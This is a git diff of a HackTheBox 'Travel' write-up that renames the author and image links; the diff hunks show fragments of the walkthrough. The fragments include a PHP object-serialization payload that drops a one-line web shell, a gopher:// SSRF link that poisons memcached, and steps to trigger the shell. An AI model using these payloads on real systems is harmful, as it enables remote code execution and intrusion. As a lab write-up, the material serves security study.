@@ -1,6 +1,6 @@
 ---
-title: Travel HackTheBox writeup made by a dumb !!!
-author: dumbx90
+title: Travel HackTheBox writeup
+author: pwndumb
 date: 2020-09-16 14:10:00 +0800
 categories: [HTB, Writeup]
 tags: [htb,hard,retired,linux,memcahe,PHP Serialization]
@@ -92,9 +92,9 @@ The **nmap**  scan give more two vrtual hosts plus what I alread know :
 
 Browser in theses hosts I not saw anything special.
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/blog-travel.png" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/blog-travel.png" style="zoom:75%;" />
 
-![](https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/blog-dev-travel.png)
+![](https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/blog-dev-travel.png)
 
 
 
@@ -247,9 +247,9 @@ This scan not give anything.
 
 ### Awesome RSS
 
-![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/travel/awesome-rss.png?raw=true)
+![](https://github.com/pwndumb/pwndumb.github.io/blob/master/assets/img/commons/hackthebox/travel/awesome-rss.png?raw=true)
 
-![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/travel/awesome-rss-post.png?raw=true)
+![](https://github.com/pwndumb/pwndumb.github.io/blob/master/assets/img/commons/hackthebox/travel/awesome-rss-post.png?raw=true)
 
 
 
@@ -630,9 +630,9 @@ $ bat customfeed.xml| head
 
 Make one request to *http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.21/myfeed.xml*  result in two in my computer, but one request the same xml again is only one request is created: 
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/reques-custom_feed.png" alt="reques-custom_feed" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/reques-custom_feed.png" alt="reques-custom_feed" style="zoom:75%;" />
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/reques-custom_feed-2.png" alt="reques-custom_feed-2" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/reques-custom_feed-2.png" alt="reques-custom_feed-2" style="zoom:75%;" />
 
 
 
@@ -644,13 +644,13 @@ Reading the source code of **rss_template.php**  I created a request with **debu
 
 > The memcache is used to cache the feed of rss xml, serialize the php data and creating a key for each xml. The key start with the string *xct_*
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/debug-render-page.png" alt="debug-render-page" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/debug-render-page.png" alt="debug-render-page" style="zoom:75%;" />
 
 Reading the **README.MD** in the git repository I can found the correct path of **debug.php**: 
 
 	> http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/debug-burp.png" alt="debug-burp" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/debug-burp.png" alt="debug-burp" style="zoom:75%;" />
 
 ### Understading the name 
 
@@ -670,9 +670,9 @@ $this->name = $this->options['extras']['prefix'] . md5("$name:$type");
 
 $name it the md5 of url and $type is string "spc". Lets check if my assumption is correct:
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/md5_burp.png" alt="md5_burp" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/md5_burp.png" alt="md5_burp" style="zoom:75%;" />
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/md5_terminal.png" alt="md5_terminal" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/md5_terminal.png" alt="md5_terminal" style="zoom:75%;" />
 
 
 
@@ -694,7 +694,7 @@ Upgrade-Insecure-Requests: 1
 
 
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/gopher-not-work.png" alt="gopher-not-work" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/gopher-not-work.png" alt="gopher-not-work" style="zoom:75%;" />
 
 ## Puting all together 
 
@@ -746,7 +746,7 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/poison-memcache.png" alt="poison-memcache" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/poison-memcache.png" alt="poison-memcache" style="zoom:75%;" />
 
 
 
@@ -777,7 +777,7 @@ class TemplateHelper
     }
 }
 
-$payload = new TemplateHelper("dumbx90.php","<?php system(\$_REQUEST['dumb']); ?>");
+$payload = new TemplateHelper("pwndumb.php","<?php system(\$_REQUEST['dumb']); ?>");
 echo serialize($payload);
 ?>
 ```
@@ -786,9 +786,9 @@ I create a directory named *logs* and run the code above:
 
 ```bash
 php pwn.php
-O:14:"TemplateHelper":2:{s:4:"file";s:11:"dumbx90.php";s:4:"data";s:35:"<?php system($_REQUEST['dumb']); ?>";}          
+O:14:"TemplateHelper":2:{s:4:"file";s:11:"pwndumb.php";s:4:"data";s:35:"<?php system($_REQUEST['dumb']); ?>";}          
 
-bat logs/dumbx90.php -p
+bat logs/pwndumb.php -p
 <?php system($_REQUEST['dumb']); ?>
 ```
 
@@ -811,11 +811,11 @@ Ok, so I copy the serialized object  and put that in *Gopherus* :
 This is usable when you know Class and Variable name used by user
 
 Give serialization payload
-example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:4:"file";s:11:"dumbx90.php";s:4:"data";s:35:"<?php system($_REQUEST['dumb']); ?>";}
+example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:4:"file";s:11:"pwndumb.php";s:4:"data";s:35:"<?php system($_REQUEST['dumb']); ?>";}
 
 Your gopher link is ready to do SSRF :
 
-gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:11:%22dumbx90.php%22%3Bs:4:%22data%22%3Bs:35:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27dumb%27%5D%29%3B%20%3F%3E%22%3B%7D%20%0d%0a
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:11:%22pwndumb.php%22%3Bs:4:%22data%22%3Bs:35:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27dumb%27%5D%29%3B%20%3F%3E%22%3B%7D%20%0d%0a
 
 After everything done, you can delete memcached item by using this payload:
 
@@ -842,7 +842,7 @@ Upgrade-Insecure-Requests: 1
 
 2. Chek *debug.php* to see if mencache was poised
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/webshel-injected_serialization_php.png" alt="webshel-injected_serialization_php" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/webshel-injected_serialization_php.png" alt="webshel-injected_serialization_php" style="zoom:75%;" />
 
 3. Send another request to the same page of hash I discovered in the #understanding the name topic. This will trigger the deserialization and  create w web-shell named *dumb.php*
 
@@ -859,11 +859,11 @@ Upgrade-Insecure-Requests: 1
 
 4.  Send a request to location of web-shell:
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/shell-OK.png" alt="shell-OK" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/shell-OK.png" alt="shell-OK" style="zoom:75%;" />
 
 > I don't know why put this hole process has to be fast and less than 60 seconds, in fact, I don't  know too if this affirmation is true. 
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/travel/web-shell-whoami.png" alt="web-shell-whoami" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/travel/web-shell-whoami.png" alt="web-shell-whoami" style="zoom:75%;" />
 
 ### Reverse Shell 
 
